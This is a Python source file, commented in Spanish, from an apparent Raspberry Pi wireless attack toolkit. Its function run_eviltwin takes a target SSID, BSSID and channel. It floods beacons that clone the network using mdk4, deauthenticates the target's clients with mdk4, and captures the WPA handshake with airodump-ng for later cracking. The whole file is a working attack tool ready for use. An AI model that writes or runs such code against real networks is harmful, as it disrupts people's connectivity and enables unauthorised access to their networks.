# /opt/beetle/tools/wifi/eviltwin_runner.py
# eviltwin_runner.py
# Optimizado para Raspberry Pi Zero W (Buster2020) con kernel re4son_4.14.93-20190126, no se puede crear un AP y estar en modo monitor.
# por tal motivo se crea un clon de la red por mdk4 y no una AP clon real.

import subprocess
import time
import os
import signal
import atexit
import sys
from display.screen import MenuDisplay

# --- Constantes / configuración ---
IFACE = "mon0"
MON_UP_CMD = ["sudo", "mon0up"]
MON_DOWN_CMD = ["sudo", "mon0down"]

_child_procs = []
_cleanup_done = False

def _run_mon_cmd(cmd, timeout=4.0):
    """Ejecuta sudo mon0up/mon0down y devuelve (returncode, stdout, stderr)."""
    try:
        p = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=timeout)
        return p.returncode, (p.stdout or ""), (p.stderr or "")
    except Exception as e:
        return -1, "", str(e)

def _iface_exists():
    """Comprueba si /sys/class/net/mon0 existe."""
    return os.path.isdir(f"/sys/class/net/{IFACE}")

def _iface_is_up():
    """Comprueba vía `ip link` si la interfaz reporta UP (no modifica nada)."""
    try:
        res = subprocess.run(["ip", "-o", "link", "show", IFACE],
                             stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=1.2)
        if res.returncode != 0:
            return False
        out = (res.stdout or "") + (res.stderr or "")
        out = out.lower()
        return ("state up" in out) or ("<up" in out)
    except Exception:
        return False

def start_mon0(wait_seconds: float = 3.0) -> bool:
    """
    Llama a 'sudo mon0up' y espera hasta `wait_seconds` a que la interfaz exista o esté UP.
    Trata 'Operation not supported (-95)' como no-fatal (según tu log).
    """
    attempts = 2
    for attempt in range(attempts):
        rc, out, err = _run_mon_cmd(MON_UP_CMD)
        combined = (out or "") + (err or "")
        # errores conocidos no fatales (driver/kernel) -> seguimos a comprobación por sysfs/ip
        if rc != 0:
            if "operation not supported" in combined.lower() or "operation not supported (-95)" in combined.lower():
                pass
        deadline = time.time() + wait_seconds
        while time.time() < deadline:
            if _iface_exists() or _iface_is_up():
                return True
            time.sleep(0.15)
        # reintentar si no apareció
    # comprobación final
    return _iface_exists() or _iface_is_up()

def stop_mon0() -> bool:
    """
    Llama a 'sudo mon0down'. Retorna True si finalmente la interfaz no existe.
    Trata 'Device "mon0" does not exist.' / 'No such device' como OK.
    """
    rc, out, err = _run_mon_cmd(MON_DOWN_CMD)
    combined = ((out or "") + (err or "")).lower()
    if 'device "mon0" does not exist' in combined or "no such device" in combined:
        return True
    # breve espera para que kernel actualice
    time.sleep(0.25)
    return not (_iface_exists() or _iface_is_up())

def _register_proc(p: subprocess.Popen):
    """Registra proceso hijo para limpieza posterior."""
    try:
        if p and p not in _child_procs:
            _child_procs.append(p)
    except Exception:
        pass

def _terminate_child_procs(timeout=3):
    """Intenta terminar ordenadamente los procesos hijos registrados."""
    global _child_procs
    for p in list(_child_procs):
        try:
            if p.poll() is None:
                try:
                    p.terminate()
                    p.wait(timeout=timeout)
                except Exception:
                    try:
                        p.kill()
                    except Exception:
                        pass
        except Exception:
            pass
    _child_procs = []

def _cleanup():
    """Limpieza global: termina procesos y baja mon0 (si corresponde)."""
    global _cleanup_done
    if _cleanup_done:
        return
    _cleanup_done = True
    try:
        _terminate_child_procs()
    except Exception:
        pass
    try:
        stop_mon0()
    except Exception:
        pass

# Registrar cleanup para salida normal del intérprete
atexit.register(_cleanup)

def _signal_handler(signum, frame):
    """Manejador SIGINT/SIGTERM -> asegura limpieza y sale."""
    _cleanup()
    code = 128 + signum if isinstance(signum, int) else 1
    try:
        sys.exit(code)
    except SystemExit:
        os._exit(code)

signal.signal(signal.SIGINT, _signal_handler)
signal.signal(signal.SIGTERM, _signal_handler)

# ------------------ Función principal original adaptada ------------------

def run_eviltwin(ssid, bssid, channel):
    """
    Ejecuta ataque Evil Twin usando MDK4 (beacon + deauth) y airodump-ng para capturar handshake.
    Usa SIEMPRE la interfaz mon0 (levantar con sudo mon0up y bajar con sudo mon0down).
    Devuelve la ruta al .cap si se capturó handshake.
    """
    display = MenuDisplay()
    timestamp = time.strftime("%Y%m%d_%H%M%S")
    folder = os.path.abspath(os.path.join(os.path.dirname(__file__), "/opt/beetle/reports/wifi"))
    os.makedirs(folder, exist_ok=True)

    ssidlist_path = f"/tmp/mdk4_ssidlist_{timestamp}.txt"
    try:
        with open(ssidlist_path, "w") as f:
            for _ in range(30):
                f.write(ssid + "\n")
    except Exception:
       
        pass

    logfile_mdk4_b = os.path.join(folder, f"mdk4_beacon_{ssid}_{timestamp}.log")
    logfile_mdk4_d = os.path.join(folder, f"mdk4_deauth_{ssid}_{timestamp}.log")
    capfile_prefix = os.path.join(folder, f"handshake_{ssid}_{timestamp}")
    capfile_final = f"{capfile_prefix}-01.cap"

    mdk4_b_proc = None
    mdk4_d_proc = None
    airodump_proc = None

    try:
        display.show_message(["Iniciando ataque", "CLON con MDK4"], center=True)
        time.sleep(1)

        # Asegurarse de que mon0 esté levantada (siempre usar sudo mon0up)
        ok = start_mon0(wait_seconds=3.0)
        if not ok:
            display.show_message(["No se pudo levantar", "mon0"], center=True)
            time.sleep(2)
            # cleanup global -> baja mon0 si corresponde y termina procesos
            _cleanup()
            return None

        # 1. Lanzar airodump-ng para capturar handshake (usa IFACE)
        airodump_cmd = [
            "sudo", "airodump-ng",
            "-c", str(channel),
            "--bssid", bssid,
            "-w", capfile_prefix,
            IFACE
        ]
        try:
            airodump_proc = subprocess.Popen(airodump_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            _register_proc(airodump_proc)
        except Exception:
            display.show_message(["Error iniciando", "airodump-ng"], center=True)
            time.sleep(1)
            _cleanup()
            return None

        # Pequeña espera para que airodump se estabilice
        time.sleep(3)

        # 2. Lanzar mdk4 en modo beacon flood (clones falsos)
        mdk4_beacon_cmd = [
            "sudo", "mdk4", IFACE, "b", "-f", ssidlist_path
        ]
        try:
            log_b = open(logfile_mdk4_b, "w")
            mdk4_b_proc = subprocess.Popen(mdk4_beacon_cmd, stdout=log_b, stderr=subprocess.STDOUT, text=True)
            _register_proc(mdk4_b_proc)
        except Exception:
            # si falla, continuamos (no bloqueante)
            mdk4_b_proc = None
            try:
                if 'log_b' in locals():
                    log_b.close()
            except Exception:
                pass

        # 3. Lanzar mdk4 en modo deauth
        mdk4_deauth_cmd = [
            "sudo", "mdk4", IFACE, "d", "-c", str(channel), "-B", bssid
        ]
        try:
            log_d = open(logfile_mdk4_d, "w")
            mdk4_d_proc = subprocess.Popen(mdk4_deauth_cmd, stdout=log_d, stderr=subprocess.STDOUT, text=True)
            _register_proc(mdk4_d_proc)
        except Exception:
            mdk4_d_proc = None
            try:
                if 'log_d' in locals():
                    log_d.close()
            except Exception:
                pass

        display.show_message(["Enviando clones y", "desautenticando..."], center=True)

        # Ejecutar ataque durante tiempo determinado (original: 30s)
        attack_duration = 30
        start_time = time.time()
        while time.time() - start_time < attack_duration:
            time.sleep(1)

        # Tiempo extra para que airodump-ng termine de capturar
        time.sleep(10)

    finally:
        # Terminar procesos limpiamente (intentamos terminar cada uno y esperar)
        for proc in [mdk4_b_proc, mdk4_d_proc, airodump_proc]:
            if proc:
                try:
                    if proc.poll() is None:
                        proc.terminate()
                        proc.wait(timeout=5)
                except Exception:
                    try:
                        proc.kill()
                    except Exception:
                        pass

        # cerrar logs si abiertos
        try:
            if 'log_b' in locals() and not log_b.closed:
                log_b.close()
        except Exception:
            pass
        try:
            if 'log_d' in locals() and not log_d.closed:
                log_d.close()
        except Exception:
            pass

        # eliminar archivo temporal de SSID list
        try:
            if os.path.exists(ssidlist_path):
                os.remove(ssidlist_path)
        except Exception:
            pass

        # limpieza global (termina cualquier proceso restante y baja mon0)
        try:
            _cleanup()
        except Exception:
            pass

    # Comprobar si se generó el .cap final y devolver resultado
    if os.path.exists(capfile_final):
        display.show_message(["Handshake capturado", "Ataque finalizado"], center=True)
        time.sleep(2)
        return capfile_final
    else:
        display.show_message(["No se capturó", "handshake"], center=True)
        time.sleep(2)
        return None


if __name__ == "__main__":
    print("Uso: importar run_eviltwin(ssid, bssid, channel) desde otro script.")

